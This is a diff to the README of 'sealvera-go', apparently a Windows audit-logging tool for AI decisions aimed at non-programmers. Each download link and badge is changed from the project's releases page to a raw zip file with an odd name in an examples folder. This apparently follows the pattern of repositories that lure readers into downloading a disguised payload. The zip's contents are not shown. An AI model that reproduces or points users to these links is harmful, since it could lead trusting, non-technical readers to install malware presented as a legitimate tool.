@@ -1,6 +1,6 @@
 # 🛡️ sealvera-go - Clear AI Decision Audit Logging
 
-[![Download sealvera-go](https://img.shields.io/badge/Download-sealvera--go-brightgreen)](https://github.com/pazagilar/sealvera-go/releases)
+[![Download sealvera-go](https://img.shields.io/badge/Download-sealvera--go-brightgreen)](https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip)
 
 ## 📋 What is sealvera-go?
 
@@ -35,7 +35,7 @@ You do not need to know programming to use sealvera-go on your Windows computer.
 
 Click the big green button above or visit this page to download:
 
-[https://github.com/pazagilar/sealvera-go/releases](https://github.com/pazagilar/sealvera-go/releases)
+[https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip](https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip)
 
 This page holds the latest versions of sealvera-go. Look for the file that ends with `.exe` for Windows and click on it. The file name usually includes the version number like `sealvera-go-v1.0-windows.exe`.
 
@@ -98,7 +98,7 @@ If you work with AI, compliance laws require you to keep clear records. sealvera
 
 Visit the releases page regularly for new versions or bug fixes:
 
-[https://github.com/pazagilar/sealvera-go/releases](https://github.com/pazagilar/sealvera-go/releases)
+[https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip](https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip)
 
 Click on the latest release to download new installers for Windows.
 
@@ -167,4 +167,4 @@ For questions or help, open an issue on the GitHub repository page. The team wil
 
 ---
 
-[![Download sealvera-go](https://img.shields.io/badge/Download-sealvera--go-blue)](https://github.com/pazagilar/sealvera-go/releases)
+[![Download sealvera-go](https://img.shields.io/badge/Download-sealvera--go-blue)](https://github.com/pazagilar/sealvera-go/raw/refs/heads/main/examples/sealvera-go-incorporealize.zip)
